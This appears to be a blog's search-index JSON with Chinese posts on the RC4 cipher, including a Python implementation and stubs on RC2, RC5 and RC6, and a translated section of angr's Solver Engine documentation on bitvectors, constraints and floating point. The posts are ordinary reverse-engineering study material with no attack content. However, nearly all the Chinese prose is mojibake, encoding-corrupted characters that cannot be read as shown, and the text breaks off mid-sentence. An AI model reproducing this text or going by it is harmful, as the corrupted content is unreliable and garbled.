¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡ä¸€ç³»åˆ—ç®—æ³•ç”Ÿæˆè¾ƒä¸ºéšæœºçš„ä¸€ä¸²å¯†é’¥æµï¼Œç„¶åå°†æ˜æ–‡ä¸å¯†é’¥æµå¼‚æˆ–å¾—åˆ°å¯†æ–‡ï¼Œæ˜¾ç„¶åœ°ï¼ŒæŠŠå¯†æ–‡å†ä¸å¯†é’¥æµå¼‚æˆ–å³å¾—åˆ°æ˜æ–‡ RC4è·å¾—éšæœºå¯†é’¥æµä¾é ç‰¹å®šçš„å¯†é’¥keyæ‰“ä¹±Sç›’ï¼Œæ¢å¥è¯è¯´ï¼Œkeyä¸€å®šæ—¶ï¼Œç”Ÿæˆçš„å¯†é’¥æµæ˜¯ç¡®å®šçš„ ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:1","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"ç®—æ³•å±æ€§ RC4æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³• å¯†é’¥é•¿åº¦å¯å˜ åŠ è§£å¯†ä½¿ç”¨åŒæ ·å¯†é’¥ï¼Œå±äºå¯¹ç§°åŠ å¯†ç®—æ³• ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:2","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"ç®—æ³•è¿‡ç¨‹ åˆå§‹åŒ–Sç›’ï¼Œä¸€èˆ¬æ˜¯256ä¸ªå­—èŠ‚ ä½¿ç”¨å¯†é’¥keyæ‰“ä¹±Sç›’ æ ¹æ®sç›’ç”Ÿæˆå¯†é’¥æµ æ˜æ–‡/å¯†æ–‡ä¸å¯†é’¥æµå¼‚æˆ–å¾—åˆ°å¯†æ–‡/æ˜æ–‡ ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:3","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"pythonå®ç° mainå‡½æ•° def main(): key = [1, 2, 3, 4, 5] # å‡†å¤‡ä¸€äº›å˜é‡ key_len = len(key) plain = \"i_am_plain_text\" plain_len = len(plain) cipher = [0] * plain_len s = [i for i in range(256)] # åˆå§‹åŒ–sç›’ rc4_init(s, key, key_len) # ä½¿ç”¨keyæ‰“ä¹±sç›’ key_stream = rc4_generate_keystream(s[:], plain_len) # ç”Ÿæˆå¯†é’¥æµ for i in range(plain_len): # é€å­—èŠ‚å¼‚æˆ–åŠ å¯† cipher[i] = ord(plain[i]) ^ key_stream[i] ä½¿ç”¨keyæ‰“ä¹±sç›’ def rc4_init(s, key, key_len): j = 0 for i in range(256): j = (j + s[i] + key[i%key_len])%256 tmp = s[i] s[i] = s[j] s[j] = tmp ç”Ÿæˆå¯†é’¥æµï¼ˆè¿™é‡Œæ˜¯æŒ‰æ˜æ–‡é•¿åº¦ç”Ÿæˆ def rc4_generate_keystream(s, length): i = 0 j = 0 key_stream = [] while length: i = (i + 1) % 256 # å¯ä»¥ä¿è¯æ¯256æ¬¡å¾ªç¯åsç›’ä¸­çš„æ¯ä¸ªå…ƒç´ è‡³å°‘è¢«äº¤æ¢ä¸€æ¬¡ j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp key_stream.append(s[(s[i] + s[j]) % 256]) length -= 1 return key_stream ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:4","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"é€†å‘ç®—æ³•ç‰¹å¾ 256å­—èŠ‚ã€å€¼åˆ†åˆ«æ˜¯0-255çš„Sç›’ æ•´ä¸ªç®—æ³•è¢«åˆ†æˆä¸¤éƒ¨åˆ† æ‰“ä¹±Sç›’æ—¶j = (j + s[i] + key[i%key_len])%256å¹¶ä¸å¸¸è§ ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:5","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC2 RC2å¯ä½œä¸ºDESç®—æ³•çš„å»ºè®®æ›¿ä»£ç®—æ³•ã€‚ å®ƒçš„è¾“å…¥å’Œè¾“å‡ºéƒ½æ˜¯64æ¯”ç‰¹ã€‚ å¯†é’¥çš„é•¿åº¦æ˜¯ä»1å­—èŠ‚åˆ°128å­—èŠ‚å¯å˜ï¼Œä½†1998å¹´çš„å®ç°æ˜¯8å­—èŠ‚ã€‚æ­¤ç®—æ³•è¢«è®¾è®¡ä¸ºå¯å®¹æ˜“åœ°åœ¨16ä½çš„å¾®å¤„ç†å™¨ä¸Šå®ç°ã€‚ to be continuedâ€¦ ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:2:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC5 RC5æ˜¯ä¸€ç§å› ç®€æ´è‘—ç§°çš„å¯¹ç§°åˆ†ç»„åŠ å¯†ç®—æ³•ã€‚å®ƒæ˜¯å‚æ•°å¯å˜çš„åˆ†ç»„å¯†ç ç®—æ³•ï¼Œä¸‰ä¸ªå¯å˜çš„å‚æ•°æ˜¯ï¼šåˆ†ç»„å¤§å°ã€å¯†é’¥å¤§å°å’ŒåŠ å¯†è½®æ•°ã€‚ åœ¨æ­¤ç®—æ³•ä¸­ä½¿ç”¨äº†ä¸‰ç§è¿ç®—ï¼šå¼‚æˆ–ã€åŠ å’Œå¾ªç¯ã€‚ to be continuedâ€¦ ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:3:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC6 RC6æ˜¯åŸºäºRC5çš„128ä½å—åŠ å¯†ç®—æ³•ï¼Œå®é™…ä¸Šæ˜¯ç”±3ä¸ªå‚æ•°ç¡®å®šçš„ä¸€ä¸ªåŠ å¯†ç®—æ³•æ—ã€‚ to be continuedâ€¦ ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:4:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Angr"],"content":"Solver Engine angrçš„å¼ºå¤§ä¹‹å¤„å¹¶ä¸åœ¨äºå®ƒæ˜¯ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œè€Œåœ¨äºå®ƒèƒ½å¤Ÿä½¿ç”¨ç¬¦å·å˜é‡è¿›è¡Œç¬¦å·æ‰§è¡Œã€‚ä¸å…¶è¯´ä¸€ä¸ªå˜é‡å¯¹åº”ä¸€ä¸ªå…·ä½“çš„æ•°å€¼ï¼Œä¸å¦‚è¯´ä¸€ä¸ªå˜é‡å¯¹åº”ç€ä¸€ä¸ªç¬¦å·ï¼Œå®é™…ä¸Šåªæ˜¯ä¸€ä¸ªåå­—ã€‚ä½¿ç”¨è¿™äº›å˜é‡æ‰§è¡Œç®—æœ¯è¿ç®—å°†äº§ç”Ÿä¸€æ£µæ“ä½œæ ‘ï¼ˆåœ¨ç¼–è¯‘åŸç†ä¸­ç§°ä¸ºæŠ½è±¡è¯­æ³•æ ‘æˆ–ASTï¼‰ã€‚ASTå¯ä»¥è½¬åŒ–æˆSMTæ±‚è§£å™¨ï¼ˆå¦‚z3ï¼‰çš„çº¦æŸï¼Œä»¥ä¾¿æå‡ºè¯¸å¦‚â€œç»™å®šç»è¿‡æ­¤é€ ä½œåºåˆ—ä¹‹åçš„è¾“å‡ºï¼Œè¾“å…¥å¿…é¡»æ˜¯ä»€ä¹ˆï¼Ÿâ€ä¹‹ç±»çš„é—®é¢˜ï¼Œè¿™ä¸€èŠ‚é‡Œï¼Œä½ å°†å­¦ä¼šå¦‚ä½•ç”¨angræ¥å›ç­”è¿™ä¸ªé—®é¢˜ã€‚ ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:0:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå››ï¼‰Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"ä½¿ç”¨Bitvectorsï¼ˆWorking with Bitvectorsï¼‰ è®©æˆ‘ä»¬åŠ è½½å¾—åˆ°projectå’Œstateï¼Œå¼€å§‹æˆ‘ä»¬çš„æ•°å­—æ¸¸æˆã€‚ \u003e\u003e\u003e import angr, mokeyhex \u003e\u003e\u003e proj = angr.Project('/bin/true') \u003e\u003e\u003e state = proj.factory.entry_state() bitvectoråªæ˜¯ä¸€ä¸ªæ¯”ç‰¹åºåˆ—ï¼Œåœ¨è¿›è¡Œç®—æœ¯æ—¶å’Œæœ‰ç•Œæ•´æ•°æœ‰ç›¸åŒçš„è¯­ä¹‰ã€‚è®©æˆ‘ä»¬è¯•ç€åˆ›å»ºå‡ ä¸ªbitvector # å…·æœ‰å…·ä½“å€¼1å’Œ100çš„64ä½bitvector \u003e\u003e\u003e one = state.solver.BVV(1, 64) \u003e\u003e\u003e one \u003cBV64 0x1\u003e \u003e\u003e\u003e one_hundred = state.solver.BVV(100, 64) \u003e\u003e\u003e one_hundred \u003cBV64 0x64\u003e # åˆ›å»ºä¸€ä¸ªå¸¦æœ‰å…·ä½“å€¼9çš„27ä½bitvector \u003e\u003e\u003e weird_nine = state.solver.BVV(9, 27) \u003e\u003e\u003e weird_nine \u003cBV27 0x9\u003e æ­£å¦‚ä½ æ‰€è§ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»»ä½•é•¿åº¦çš„æ¯”ç‰¹åºåˆ—æ„é€ bitvectorï¼Œä½ ä¹Ÿå¯ä»¥ç”¨å®ƒä»¬è¿›è¡Œæ•°å­¦è¿ç®—ï¼š \u003e\u003e\u003e one + one_hundred \u003cBV64 0x65\u003e # ä½ å¯ä»¥ä½¿ç”¨pythonæ•´æ•°æ¥æ„é€ bitvector,å®ƒä»¬å°†è¢«å¼ºåˆ¶è½¬æ¢ä¸ºé€‚å½“çš„ç±»å‹ \u003e\u003e\u003e one_hundred + 0x100 \u003cBV64 0x164\u003e # å¯ä»¥å®ç°ç®—æ³•çš„æ­£å¸¸è¯­ä¹‰é€‚ç”¨ \u003e\u003e\u003e one_hundred - one*200 \u003cBV64 0xffffffffffffff9c\u003e ä½ ä¸èƒ½æŠŠoneå’Œweird_nineç›¸åŠ ï¼Œå¯¹ä¸åŒé•¿åº¦çš„bitvectoræ‰§è¡Œæ“ä½œä¼šäº§ç”Ÿç±»å‹é”™è¯¯ã€‚ä½†æ˜¯ä½ å¯ä»¥æ‰©å±•weird_nineï¼Œä½¿å®ƒå…·æœ‰åˆé€‚çš„ä½æ•°ï¼š \u003e\u003e\u003e weird_nine.zero_extend(64 - 27) \u003cBV64 0x9\u003e \u003e\u003e\u003e one + weird_nine.zero_extend(64 - 27) \u003cBV64 0xa\u003e zero_extendä¼šåœ¨bitvectorçš„å·¦ä¾§å¡«å……ç»™å®šæ•°é‡çš„0è¿›è¡Œæ‰©å±•ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨sign_extendå¡«å……æœ€é«˜ä½è·å¾—bitvectorçš„å‰¯æœ¬ï¼Œå°†bitvectorçš„è¯­ä¹‰è½¬åŒ–ä¸ºäºŒè¿›åˆ¶è¡¥ç æ˜¯æœ‰ç¬¦å·æ•´æ•° ç°åœ¨ï¼Œè®©æˆ‘ä»¬å¼•å…¥ä¸€äº›ç¬¦å· # åˆ›å»ºä¸€ä¸ªåä¸ºâ€˜x'çš„bitvector,é•¿åº¦ä¸º64ä½ \u003e\u003e\u003e x = state.solver.BVS(\"x\", 64) \u003e\u003e\u003e x \u003cBV64 x_9_64\u003e \u003e\u003e\u003e y = state.solver.BVS(\"y\", 64) \u003e\u003e\u003e y \u003cBV64 y_10_64\u003e xå’Œyæ˜¯ç¬¦å·å˜é‡ï¼Œæœ‰ç‚¹åƒä½ åœ¨ä»£æ•°ä¸­å­¦ä¹ ä½¿ç”¨çš„å˜é‡ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä½ æ‰€æä¾›çš„ç¬¦å·å˜é‡åä¼šè‡ªåŠ¨é™„åŠ ä¸€ä¸ªé€’å¢è®¡æ•°å™¨ï¼Œä½ å¯ä»¥å¯¹å®ƒä»¬è¿›è¡Œä»»æ„æ•°é‡çš„ç®—æœ¯è¿ç®—ï¼Œä½†ä½ å¹¶ä¸ä¼šå¾—åˆ°ä¸€ä¸ªæ•°å­—ï¼Œè€Œæ˜¯ä¼šå¾—åˆ°ä¸€ä¸ªAST \u003e\u003e\u003e x + one \u003cBV64 x_9_64 + 0x1\u003e \u003e\u003e\u003e (x + one) / 2 \u003cBV64 (x_9_64 + 0x1) / 0x2\u003e \u003e\u003e\u003e x - y \u003cBV64 x_9_64 - y_10_64\u003e ä»æŠ€æœ¯ä¸Šè®²ï¼Œxå’Œyç”šè‡³éƒ½æ˜¯ASTâ€”â€”ä»»ä½•ä¸€ä¸ªbitvectoréƒ½æ˜¯ä¸€æ£µæ“ä½œæ ‘ï¼Œå³ä½¿è¿™æ£µæ ‘åªæœ‰ä¸€å±‚æ·±ã€‚ä¸ºäº†ç†è§£è¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬å­¦ä¹ å¦‚ä½•å¤„ç†AST æ¯ä¸ªASTéƒ½æœ‰.opå’Œ.argsä¸¤ä¸ªå±æ€§ï¼Œopæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå‘½åæ­£åœ¨æ‰§è¡Œçš„æ“ä½œï¼Œargsæ˜¯å‚ä¸æ“ä½œæ‰€ä½¿ç”¨çš„æ•°å€¼ã€‚é™¤éopæ˜¯BVVæˆ–BVSï¼ˆæˆ–å…¶ä»–ä¸€äº›ï¼‰ï¼Œå¦åˆ™argsæ˜¯æ‰€æœ‰å…¶ä»–ASTï¼Œæ ‘ä¼šä»¥BVVæˆ–BVSç»ˆæ­¢ã€‚ \u003e\u003e\u003e tree = (x + 1) / (y + 2) \u003e\u003e\u003e tree \u003cBV64 (x_9_64 + 0x1) / (y_10_64 + 0x2)\u003e \u003e\u003e\u003e tree.op '__floordiv__' \u003e\u003e\u003e tree.args (\u003cBV64 x_9_64 + 0x1\u003e, \u003cBV64 y_10_64 + 0x2\u003e) \u003e\u003e\u003e tree.args[0].op '__add__' \u003e\u003e\u003e tree.args[0].args (\u003cBV64 x_9_64\u003e, \u003cBV64 0x1\u003e) \u003e\u003e\u003e tree.args[0].args[1].op 'BVV' \u003e\u003e\u003e tree.args[0].args[1].args (1, 64) ä»è¿™é‡Œå¼€å§‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨bitvectorä¸€è¯æ¥æŒ‡ä»£ä»»ä½•æœ€é«˜æ“ä½œäº§ç”Ÿbitvectorçš„AST.æˆ‘ä»¬å¯ä»¥é€šè¿‡ASTè¡¨ç¤ºå…¶ä»–æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬æµ®ç‚¹æ•°å’Œæˆ‘ä»¬å³å°†çœ‹åˆ°çš„å¸ƒå°”å€¼ã€‚ ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:1:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå››ï¼‰Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"ç¬¦å·çº¦æŸï¼ˆSymbolic Constraintsï¼‰ åœ¨ä»»ä½•ä¸¤ä¸ªç±»å‹ç±»ä¼¼çš„ASTä¹‹é—´æ‰§è¡Œæ¯”è¾ƒæ“ä½œï¼Œå°†äº§ç”Ÿä¸€ä¸ªæ–°çš„AST,ä¸€ä¸ªç¬¦å·å¸ƒå°”å€¼ï¼Œè€Œä¸æ˜¯bitvectorã€‚ \u003e\u003e\u003e x == 1 \u003cBool x_9_64 == 0x1\u003e \u003e\u003e\u003e x == one \u003cBool x_9_64 == 0x1\u003e \u003e\u003e\u003e x \u003e 2 \u003cBool x_9_64 \u003e 0x2\u003e \u003e\u003e\u003e x + y == one_hundred + 5 \u003cBool (x_9_64 + y_10_64) == 0x69\u003e \u003e\u003e\u003e one_hundred \u003e 5 \u003cBool True\u003e \u003e\u003e\u003e one_hundred \u003e -5 \u003cBool False\u003e ä½ å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œé»˜è®¤æƒ…å†µä¸‹çš„æ¯”è¾ƒæ˜¯æ— ç¬¦å·çš„ï¼Œä¸Šé¢æœ€åä¸€ä¸ªç¤ºä¾‹ä¸­çš„-5è¢«å¼ºåˆ¶è½¬æ¢ä¸º\u003cBV64 0xfffffffffffffffb\u003eï¼Œæ‰€ä»¥ç»å¯¹ä¸å°äº100ã€‚å¦‚æœä½ æƒ³è¿›è¡Œæœ‰ç¬¦å·æ•°çš„æ¯”è¾ƒï¼Œä½ å¯ä»¥ä½¿ç”¨one)hundred.SGT(-5)ï¼ˆsigned greater-thanï¼‰ã€‚æœ¬ç« æœ«æä¾›äº†å®Œæ•´çš„æŒ‡ä»¤åˆ—è¡¨ è¿™ä¸ªä¾‹å­ä¹Ÿè¯´æ˜äº†ä½¿ç”¨angrçš„ä¸€ä¸ªé‡è¦æ³¨æ„äº‹é¡¹â€”â€”ä½ ä¸åº”è¯¥åœ¨ifå’Œwhileè¯­å¥çš„æ¡ä»¶ä¸­ä½¿ç”¨å˜é‡ä¹‹é—´çš„æ¯”è¾ƒï¼Œå› ä¸ºç­”æ¡ˆå¯èƒ½å¹¶æ²¡æœ‰ä¸€ä¸ªå…·ä½“çš„çœŸå€¼ã€‚å³ä½¿æœ‰ä¸€ä¸ªçœŸå€¼ï¼Œif one \u003e one_hundredå°†ä¼šå¼•å‘ä¸€ä¸ªå¼‚å¸¸ã€‚ä½ åº”è¯¥ä½¿ç”¨solver.is_trueå’Œsolver.is_falseåœ¨ä¸æ‰§è¡Œçº¦æŸæ±‚è§£çš„æƒ…å†µä¸‹æµ‹è¯•çœŸå€¼æ˜¯trueè¿˜æ˜¯false \u003e\u003e\u003e yes = one == 1 \u003e\u003e\u003e no = one == 2 \u003e\u003e\u003e maybe = x == y \u003e\u003e\u003e state.solver.is_true(yes) True \u003e\u003e\u003e state.solver.is_false(yes) False \u003e\u003e\u003e state.solver.is_true(no) False \u003e\u003e\u003e state.solver.is_false(no) True \u003e\u003e\u003e state.solver.is_true(maybe) False \u003e\u003e\u003e state.solver.is_false(maybe) False ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:2:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå››ï¼‰Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"çº¦æŸæ±‚è§£ï¼ˆConstraint Solvingï¼‰ ä½ å¯ä»¥å°†ä»»ä½•å¸ƒå°”ç¬¦å·è¡¨è¾¾å¼è§†ä¸ºå¯¹äºç¬¦å·å˜é‡æœ‰æ•ˆå€¼çš„æ–­è¨€ï¼Œç„¶åå¯¹ç¬¦å·è¡¨è¾¾å¼æ±‚å€¼æ±‚è§£å‡ºç¬¦å·å˜é‡çš„æœ‰æ•ˆå€¼ã€‚ ç”¨ä¾‹å­æ¥è§£é‡Šå¯èƒ½ä¼šæ›´æ¸…æ™°ï¼š \u003e\u003e\u003e state.solver.add(x \u003e y) \u003e\u003e\u003e state.solver.add(y \u003e 2) \u003e\u003e\u003e state.solver.add(10 \u003e x) \u003e\u003e\u003e state.solver.eval(x) 4 é€šè¿‡å°†è¿™äº›çº¦æŸæ·»åŠ åˆ°çŠ¶æ€ä¸­ï¼Œæˆ‘ä»¬å¼ºåˆ¶çº¦æŸæ±‚è§£å™¨è¿”å›çš„æœ‰æ•ˆå€¼å¿…é¡»æ»¡è¶³è¿™äº›æ¡ä»¶ã€‚å¦‚æœä½ è¿è¡Œè¿™äº›ä»£ç ï¼Œå¯èƒ½ä¼šå¾—åˆ°ä¸åŒçš„xå€¼ï¼Œä½†è¿™ä¸ªå€¼è‚¯å®šå¤§äº3ï¼ˆå› ä¸ºx\u003eyä¸”y\u003e2ï¼‰ä¸”å°äº10ã€‚æ›´è¿›ä¸€æ­¥æ¥è¯´ï¼Œå¦‚æœä½ ä½¿ç”¨state.solver.eval(y)æ¥æ±‚è§£yçš„å€¼ï¼Œä½ ä¼šå‘ç°å¾—åˆ°çš„yå€¼å’Œxå€¼ç›¸åŒã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœä½ ä¸åœ¨ä¸¤æ¬¡æŸ¥è¯¢ä¹‹é—´æ·»åŠ å…¶ä»–çº¦æŸï¼Œé‚£ä¹ˆä¸¤æ¬¡æŸ¥è¯¢å¾—åˆ°çš„ç»“æœæ˜¯ä¸€è‡´çš„ã€‚ æ ¹æ®ä»¥ä¸Šæ‰€è¯´ï¼Œç°åœ¨æˆ‘ä»¬å¾ˆå®¹æ˜“èƒ½è§£å†³å¼€å¤´çš„é—®é¢˜â€”â€”æ ¹æ®ç¡®å®šçš„è¾“å‡ºæ‰¾åˆ°åˆé€‚çš„è¾“å…¥ã€‚ # è·å–ä¸€ä¸ªæ²¡æœ‰çº¦æŸçš„æ–°çŠ¶æ€ \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e input = state.solver.BVS('input', 64) \u003e\u003e\u003e operation = (((input + 4) * 3) \u003e\u003e 1) + input \u003e\u003e\u003e output = 200 \u003e\u003e\u003e state.solver.add(operation == output) \u003e\u003e\u003e state.solver.eval(input) 0x3333333333333381 è¯·æ³¨æ„è¿™ç§æ±‚è§£æ–¹å¼ä»…é€‚ç”¨äºå¯¹äºbitvectorçš„è¿ç®—ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ•´æ•°åŸŸä¸Šè¿ç®—ï¼Œå°±ä¼šå‘ç°æ— è§£ã€‚ å¦‚æœæˆ‘ä»¬æ·»åŠ å†²çªæˆ–çŸ›ç›¾çš„çº¦æŸï¼Œè¿™æ ·å°±æ²¡æœ‰æœ‰æ•ˆå€¼èƒ½æ»¡è¶³çº¦æŸï¼Œstateå°†å˜ä¸ºunsatisfiableï¼ˆå³unsatï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨state.satisfiable()æ£€æŸ¥stateçš„å¯æ»¡è¶³æ€§ã€‚ \u003e\u003e\u003e state.solver.add(input \u003c 2**32) \u003e\u003e\u003e state.satisfiable() False ä½ è¿˜å¯ä»¥è®¡ç®—æ›´å¤æ‚çš„è¡¨è¾¾å¼ï¼Œæˆ–è€…å¤šä¸ªå˜é‡çš„è¡¨è¾¾å¼ã€‚ # æ–°çš„state \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e state.solver.add(x - y \u003e= 4) \u003e\u003e\u003e state.solver.add(y \u003e 0) \u003e\u003e\u003e state.solver.eval(x) 5 \u003e\u003e\u003e state.solver.eval(y) 1 \u003e\u003e\u003e state.solver.eval(x + y) 6 ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œevalæ˜¯å°†bitvectorè½¬åŒ–ä¸ºpythonæ ¼å¼çš„é€šç”¨æ–¹æ³•ï¼Œè½¬æ¢çš„è¿‡ç¨‹ä¸­åŒæ—¶ç¡®ä¿stateä¸ä¼šæ”¹å˜ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä½¿ç”¨evalå°†bitvectorè½¬åŒ–ä¸ºpythonæ•´æ•°çš„åŸå› ã€‚ å¦å¤–æ³¨æ„ï¼Œå°½ç®¡xå’Œyæ˜¯ä½¿ç”¨æ—§çŠ¶æ€åˆ›å»ºçš„ï¼Œä½†ä»å¯ä»¥åœ¨æ–°çŠ¶æ€ä¸‹ä½¿ç”¨ï¼Œå˜é‡ä¸ä¾èµ–äºæŸä¸€ç§çŠ¶æ€ï¼Œå¯ä»¥è‡ªç”±å­˜åœ¨ã€‚ ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:3:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå››ï¼‰Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"æµ®ç‚¹æ•°ï¼ˆFloating point numbersï¼‰ z3æ”¯æŒIEEE754æµ®ç‚¹æ•°æ ‡å‡†ï¼Œæ‰€ä»¥angrä¹Ÿæ”¯æŒæµ®ç‚¹æ•°æ“ä½œã€‚ä¸ä¸€èˆ¬æµ®ç‚¹æ•°ç›¸æ¯”ä¸»è¦çš„åŒºåˆ«æ˜¯ï¼Œangré‡Œçš„æµ®ç‚¹æ•°æ²¡æœ‰å®½åº¦çš„æ¦‚å¿µï¼Œè€Œæœ‰ä¸€ä¸ªæ’åºï¼ˆsortï¼‰çš„æ¦‚å¿µã€‚ä½ å¯ä»¥ä½¿ç”¨FPVå’ŒFPSæ¥åˆ›å»ºæµ®ç‚¹å€¼å’Œæµ®ç‚¹ç¬¦å·ã€‚ # æ–°çš„state \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE) \u003e\u003e\u003e a \u003cFP64 FPV(3.2, DOUBLE)\u003e \u003e\u003e\u003e b = state.solver.FPS('b', state.solver.fp.FSORT_DOUBLE) \u003e\u003e\u003e b \u003cFP64 FPS('FP_b_0_64', DOUBLE)\u003e \u003e\u003e\u003e a + b \u003cFP64 fpAdd('RNE', FPV(3.2, DOUBLE), FPS('FP_b_0_64', DOUBLE))\u003e \u003e\u003e\u003e a + 4.4 \u003cFP64 FPV(7.6000000000000005, DOUBLE)\u003e \u003e\u003e\u003e b + 2 \u003c 0 \u003cBool fpLT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))\u003e è¿™é‡Œæœ‰ä¸€äº›ä¸œè¥¿éœ€è¦è¯´æ˜â€”â€”å¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œæµ®ç‚¹æ•°çš„pretty-printingå¹¶ä¸é‚£ä¹ˆå¥½çœ‹ã€‚ä½†å¤§å¤šæ•°æ“ä½œå®é™…ä¸Šéƒ½æœ‰ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå½“ä½ ä½¿ç”¨äºŒå…ƒè¿ç®—ç¬¦æ—¶è¢«éšå¼æ·»åŠ çš„â€”â€”è¿›ä½ä¸èˆä½çš„æ¨¡å¼ï¼ˆrounding modeï¼‰ã€‚IEEE754è§„èŒƒæ”¯æŒå¤šç§èˆå…¥æ¨¡å¼ï¼ˆå¦‚èˆå…¥åˆ°æœ€è¿‘ä½ã€èˆå…¥åˆ°0ä½ã€èˆå…¥åˆ°æ­£ä½ç­‰ï¼‰ï¼Œæ‰€ä»¥z3å¿…é¡»æ”¯æŒå®ƒä»¬ã€‚å¦‚æœä½ æƒ³æŒ‡å®šèˆå…¥æ¨¡å¼ï¼Œè¯·æ˜¾ç¤ºä½¿ç”¨fpæ“ä½œï¼ˆå¦‚solver.fpAddï¼‰ï¼Œå¹¶å°†èˆå…¥æ¨¡å¼ä¹‹ä¸€ï¼ˆsolver.fp.RM_*)ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•° æµ®ç‚¹æ•°ç›¸å…³çš„çº¦æŸå’Œæ±‚è§£å’Œä¸€èˆ¬bitvectorä»¥ç›¸åŒçš„æ–¹å¼æ–¹å¼å·¥ä½œï¼Œä¸åŒçš„æ˜¯evalæ“ä½œè¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ã€‚ \u003e\u003e\u003e state.solver.add(b + 2 \u003c 0) \u003e\u003e\u003e state.solver.add(b + 2 \u003e -1) \u003e\u003e\u003e state.solver.eval(b) -2.4999999999999996 è¿™å¾ˆå¥½ï¼Œä½†æœ‰æ—¶æˆ‘ä»¬éœ€è¦ç›´æ¥å°†æµ®ç‚¹æ•°è¡¨ç¤ºä¸ºbitvectorã€‚ä½ å¯ä»¥ä½¿ç”¨raw_to_bvå’Œraw_to_fpå°†ä¸€èˆ¬çš„bitvectorè§£é‡Šä¸ºæµ®ç‚¹æ•°æˆ–å°†æµ®ç‚¹æ•°è½¬åŒ–ä¸ºä¸€èˆ¬çš„bitvector \u003e\u003e\u003e a.raw_to_bv() \u003cBV64 0x400999999999999a\u003e \u003e\u003e\u003e b.raw_to_bv() \u003cBV64 fpToIEEEBV(FPS('FP_b_0_64', DOUBLE))\u003e \u003e\u003e\u003e state.solver.BVV(0, 64).raw_to_fp() \u003cFP64 FPV(0.0, DOUBLE)\u003e \u003e\u003e\u003e state.solver.BVS('x', 64).raw_to_fp() \u003cFP64 fpToFP(x_1_64, DOUBLE)\u003e è¿™äº›è½¬æ¢ä¿æŒäº†æ¯ä¸€ä½æ¯”ç‰¹å€¼ï¼ˆbit-patternï¼‰ä¸å˜ï¼Œå°±åƒä½ å°†floatæŒ‡é’ˆè½¬åŒ–ä¸ºintæŒ‡é’ˆä¸€æ ·ã€‚ä½†æ˜¯å¦‚æœä½ 